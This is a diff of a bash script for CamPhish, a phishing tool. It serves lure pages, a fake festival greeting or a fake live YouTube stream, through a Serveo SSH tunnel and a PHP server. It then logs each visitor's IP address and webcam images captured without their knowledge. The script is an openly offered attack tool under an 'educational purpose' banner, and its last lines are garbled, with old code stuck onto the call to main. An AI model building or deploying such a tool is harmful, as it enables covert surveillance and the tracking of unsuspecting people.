@@ -1,108 +1,145 @@
 #!/bin/bash
-# CamPhish v1.1 - Updated for new Serveo links
-# Powered by Infinite Hackers
-# Credits: thelinuxchoice
-# Modified to support serveousercontent.com domains
+# CamPhish v2.0 - Updated for modern Serveo & unlimited captures
+# Educational purpose only
 
-trap 'printf "\n";stop' 2
+trap 'printf "\n"; stop' 2
 
 banner() {
-clear
-printf "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m\n"
-printf "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m\n"
-printf "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m\n"
-printf "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m\n"
-printf "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m\n"
-printf "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m\n"
-printf "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m\n"
-printf "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m\n\n"
-
-printf " \e[1;77m BY Infinite Hackers | Only Educational Purpose \e[0m \n"
-printf "\n"
-}
-
-dependencies() {
-command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
+    clear
+    echo -e "\e[1;92m  _______  _______  _______  \e[0m\e[1;77m_______          _________ _______          \e[0m"
+    echo -e "\e[1;92m (  ____ \(  ___  )(       )\e[0m\e[1;77m(  ____ )|\     /|\__   __/(  ____ \|\     /|\e[0m"
+    echo -e "\e[1;92m | (    \/| (   ) || () () |\e[0m\e[1;77m| (    )|| )   ( |   ) (   | (    \/| )   ( |\e[0m"
+    echo -e "\e[1;92m | |      | (___) || || || |\e[0m\e[1;77m| (____)|| (___) |   | |   | (_____ | (___) |\e[0m"
+    echo -e "\e[1;92m | |      |  ___  || |(_)| |\e[0m\e[1;77m|  _____)|  ___  |   | |   (_____  )|  ___  |\e[0m"
+    echo -e "\e[1;92m | |      | (   ) || |   | |\e[0m\e[1;77m| (      | (   ) |   | |         ) || (   ) |\e[0m"
+    echo -e "\e[1;92m | (____/\| )   ( || )   ( |\e[0m\e[1;77m| )      | )   ( |___) (___/\____) || )   ( |\e[0m"
+    echo -e "\e[1;92m (_______/|/     \||/     \|\e[0m\e[1;77m|/       |/     \|\_______/\_______)|/     \|\e[0m"
+    echo -e "\n\e[1;77m              Educational Purpose - Understand & Protect\e[0m\n"
 }
 
 stop() {
-checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
-checkphp=$(ps aux | grep -o "php" | head -n1)
-checkssh=$(ps aux | grep -o "ssh" | head -n1)
-if [[ $checkngrok == *'ngrok'* ]]; then
-pkill -f -2 ngrok > /dev/null 2>&1
-killall -2 ngrok > /dev/null 2>&1
-fi
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-if [[ $checkssh == *'ssh'* ]]; then
-killall -2 ssh > /dev/null 2>&1
-fi
-exit 1
+    pkill -f ngrok 2>/dev/null
+    pkill -f php 2>/dev/null
+    pkill -f ssh 2>/dev/null
+    exit 1
 }
 
-catch_ip() {
-ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
-IFS=$'\n'
-printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
-cat ip.txt >> saved.ip.txt
+get_serveo_link() {
+    local attempt=0
+    local max_attempts=12
+    local link=""
+    while [ $attempt -lt $max_attempts ]; do
+        link=$(grep -oE 'https://[a-zA-Z0-9-]+\.(serveo\.net|serveousercontent\.com)' sendlink 2>/dev/null | head -1)
+        if [ -n "$link" ]; then
+            echo "$link"
+            return 0
+        fi
+        link=$(grep -o 'https://[^ ]*' sendlink 2>/dev/null | head -1)
+        if [ -n "$link" ]; then
+            echo "$link"
+            return 0
+        fi
+        sleep 1
+        ((attempt++))
+    done
+    return 1
 }
 
-checkfound() {
-printf "\n"
-printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
-while [ true ]; do
-if [[ -e "ip.txt" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
-catch_ip
-rm -rf ip.txt
-fi
-sleep 0.5
-if [[ -e "Log.log" ]]; then
-printf "\n\e[1;92m[\e[0m+\e[1;92m] Cam file received!\e[0m\n"
-rm -rf Log.log
-fi
-sleep 0.5
-done
+serveo_tunnel() {
+    command -v ssh >/dev/null 2>&1 || { echo "ssh not installed"; exit 1; }
+    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo tunnel...\e[0m"
+    rm -f sendlink
+    ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net > sendlink 2>&1 &
+    SSH_PID=$!
+    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Waiting for tunnel (10 sec)...\e[0m"
+    sleep 10
+    LINK=$(get_serveo_link)
+    if [ -z "$LINK" ]; then
+        echo -e "\e[1;91m[!] Failed to get link from Serveo.\e[0m"
+        kill $SSH_PID 2>/dev/null
+        exit 1
+    fi
+    echo -e "\e[1;92m[\e[0m+\e[1;92m] Direct link:\e[0m \e[1;97m$LINK\e[0m"
+    echo "$LINK" > current_link.txt
 }
 
-server() {
-command -v ssh > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
-
-printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Serveo...\e[0m\n"
-
-if [[ $checkphp == *'php'* ]]; then
-killall -2 php > /dev/null 2>&1
-fi
-
-if [[ $subdomain_resp == true ]]; then
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R '$subdomain':80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
-sleep 8
-else
-$(which sh) -c 'ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2> /dev/null > sendlink' &
-sleep 8
-fi
-
-printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Starting php server... (localhost:3333)\e[0m\n"
-fuser -k 3333/tcp > /dev/null 2>&1
-php -S localhost:3333 > /dev/null 2>&1 &
-sleep 3
-
-# Updated regex to match new serveo domains (serveo.net or serveousercontent.com)
-send_link=$(grep -oE 'https://[a-zA-Z0-9-]+\.(serveo\.net|serveousercontent\.com)' sendlink | head -1)
-if [[ -z "$send_link" ]]; then
-    # Fallback: try to extract any https URL from sendlink
-    send_link=$(grep -o 'https://[^ ]*' sendlink | head -1)
-fi
-
-printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Direct link:\e[0m\e[1;77m %s\n' "$send_link"
+start_php_server() {
+    echo -e "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting PHP server on port 3333...\e[0m"
+    fuser -k 3333/tcp 2>/dev/null
+    php -S localhost:3333 > /dev/null 2>&1 &
+    PHP_PID=$!
+    sleep 2
+    if ! kill -0 $PHP_PID 2>/dev/null; then
+        echo -e "\e[1;91m[!] PHP server failed.\e[0m"
+        exit 1
+    fi
 }
 
-payload_ngrok() {
-link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-sed 's+forwarding_link+'$link'+g' template.php > index.php
-if [[ $option_tem -eq 1 ]]; then
+build_payload() {
+    local link="$1"
+    sed "s+forwarding_link+$link+g" template.php > index.php
+    if [ "$option_tem" -eq 1 ]; then
+        sed "s+forwarding_link+$link+g" festivalwishes.html > index3.html
+        sed "s+fes_name+$fest_name+g" index3.html > index2.html
+    else
+        sed "s+forwarding_link+$link+g" LiveYTTV.html > index3.html
+        sed "s+live_yt_tv+$yt_video_ID+g" index3.html > index2.html
+    fi
+    rm -f index3.html
+    echo -e "\e[1;92m[+] Payload built. Waiting for targets...\e[0m"
+}
+
+monitor_captures() {
+    echo -e "\e[1;93m[*] Monitoring for captures. Press Ctrl+C to stop.\e[0m\n"
+    while true; do
+        if [ -f "ip.txt" ]; then
+            IP=$(grep -a 'IP:' ip.txt | cut -d ' ' -f2 | tr -d '\r')
+            echo -e "\e[1;92m[+] New IP captured:\e[0m \e[1;77m$IP\e[0m"
+            cat ip.txt >> saved_ips.txt
+            rm -f ip.txt
+        fi
+        if [ -f "Log.log" ]; then
+            TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
+            mv Log.log "capture_$TIMESTAMP.log"
+            echo -e "\e[1;92m[+] Image captured! Saved as capture_$TIMESTAMP.log\e[0m"
+        fi
+        sleep 1
+    done
+}
+
+select_template() {
+    echo -e "\n----- Choose a template -----"
+    echo -e "\e[1;92m[01]\e[0m Festival Wishing"
+    echo -e "\e[1;92m[02]\e[0m Live Youtube TV"
+    read -p $'\n\e[1;92m[+] Choose template [1-2]: \e[0m' option_tem
+    case $option_tem in
+        1)
+            read -p $'\e[1;92m[+] Enter festival name: \e[0m' fest_name
+            fest_name="${fest_name// /}"
+            ;;
+        2)
+            read -p $'\e[1;92m[+] Enter YouTube video ID: \e[0m' yt_video_ID
+            ;;
+        *)
+            echo "Invalid, using default (1)"
+            option_tem=1
+            fest_name="HappyBirthday"
+            ;;
+    esac
+}
+
+main() {
+    banner
+    select_template
+    rm -f capture_*.log saved_ips.txt ip.txt Log.log current_link.txt sendlink
+    start_php_server
+    serveo_tunnel
+    LINK=$(cat current_link.txt)
+    build_payload "$LINK"
+    monitor_captures
+}
+
+mainif [[ $option_tem -eq 1 ]]; then
 sed 's+forwarding_link+'$link'+g' festivalwishes.html > index3.html
 sed 's+fes_name+'$fest_name'+g' index3.html > index2.html
 else
